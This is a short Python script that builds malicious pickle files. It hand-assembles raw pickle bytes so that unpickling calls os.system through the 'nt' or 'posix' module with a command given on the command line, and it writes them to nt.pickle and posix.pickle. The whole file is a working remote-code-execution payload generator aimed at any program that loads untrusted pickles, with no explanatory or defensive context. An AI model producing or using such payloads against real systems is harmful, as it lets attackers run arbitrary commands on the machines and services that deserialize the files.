import struct
import sys

def produce_pickle_bytes(platform, cmd):
    b = b'\x80\x04\x95'
    b += struct.pack('L', 22 + len(platform) + len(cmd))
    b += b'\x8c' + struct.pack('b', len(platform)) + platform.encode()
    b += b'\x94\x8c\x06system\x94\x93\x94'
    b += b'\x8c' + struct.pack('b', len(cmd)) + cmd.encode()
    b += b'\x94\x85\x94R\x94.'
    print(b)
    return b

if __name__ == '__main__':
    if len(sys.argv) != 2:
        exit(f"usage: {sys.argv[0]} cmd")
    CMD = sys.argv[1]
    with open('nt.pickle', 'wb') as f:
        f.write(produce_pickle_bytes('nt', f"{CMD}"))
    with open('posix.pickle', 'wb') as f:
        f.write(produce_pickle_bytes('posix', f"{CMD}"))